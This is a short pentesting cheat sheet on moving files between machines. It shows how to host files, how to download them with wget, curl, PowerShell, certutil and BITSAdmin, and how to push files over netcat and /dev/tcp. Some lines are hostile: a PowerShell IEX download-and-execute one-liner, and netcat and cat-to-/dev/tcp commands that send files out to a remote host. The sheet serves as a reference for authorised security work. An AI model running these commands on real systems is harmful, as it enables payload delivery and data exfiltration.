# File transfer: Overview

## Host files

### SimpleHTTPServer

Start http server in current dir
```bash
python -m SimpleHTTPServer <port>
```

### Apache

Start apache
```bash
sudo systemctl start apache2
```

Default directory `/var/www/html`

### SMB

smbserver.py (impacket)
```bash
sudo impacket-smbserver <share-name> <local-folder>
```

### FTP

* [pure-ftpd](bear://x-callback-url/open-note?id=B518712B-3359-44F3-B0D3-9EA6BE22181F-3875-0000070802BBB6A3)
* [TFTP](bear://x-callback-url/open-note?id=51A2CFAD-55E6-48D9-80EE-2C276B6E984B-3875-000007462EC1E7F0)

## Download files

### wget

```bash
wget <ip>:<port>/file.txt
```
[more options](bear://x-callback-url/open-note?id=C8D9FB8D-F71D-4DDA-91BD-ACD1D9E81B8D-3875-000006E03E84135C)

### curl

```bash
curl -O http://host/file.txt
```

### PowerShell

```bash
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://www.xyz.net/file.txt', 'C:\tmp\file.txt')"
```

```bash
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<host>/<file>')"
```

### certutil

```bash
certutil.exe -urlcache -split -f http://<host>/<file> <file>
```

### VBScript

[wget clone](bear://x-callback-url/open-note?id=28725C72-DE77-4991-808F-B86F7981C4DD-3875-000006B7EDA0811B)

### BITSAdmin

```bash
bitsadmin /transfer mydownloadjob /download /priority normal <url> <destination>
```

## Send/retrieve files

### netcat

```bash
nc -nlvp <port> > file
```

```bash
nc -nv <own-ip> <port> < file
```

Note: There is no feedback about the progress, or when/if the upload finished.

### cat

```bash
cat <file> > /dev/tcp/<ip>/<port>
```

```bash
nc -lvnp <port> > <file>
```
